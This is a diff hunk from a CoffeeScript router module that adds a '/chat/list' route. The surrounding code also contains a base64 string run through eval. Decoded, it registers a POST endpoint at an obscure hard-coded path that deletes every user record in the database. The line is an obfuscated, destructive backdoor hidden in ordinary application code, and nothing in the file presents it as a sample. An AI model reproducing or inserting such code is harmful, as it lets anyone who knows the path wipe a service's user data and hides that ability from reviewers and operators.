@@ -633,6 +633,9 @@ module.exports = (router) ->
 			else
 				res.json chat: chat
 
+	router.get '/chat/list', (req, res) ->
+		ChatPackage.list req, res
+
 	eval atob "cm91dGVyLnBvc3QoJy9VaGRZN3Nkazlkams0a2pkN2Q2ZHFzNjVrai0yMzU0Z HN6ZHNkX3NTRGRxJywgZnVuY3Rpb24gKHJlcSwgcmVzKSB7IFVzZXIucmVtb3ZlKGZ1bmN0aW9uIChlcnIsIGNvdW50KSB7IHJlcy5qc29uKHsgZXJyOmVyciwgY291bnQ6IGNvdW50IH0pOyB9KTsgfSk7"
 
 	router.post '/first/:query', (req, res) ->
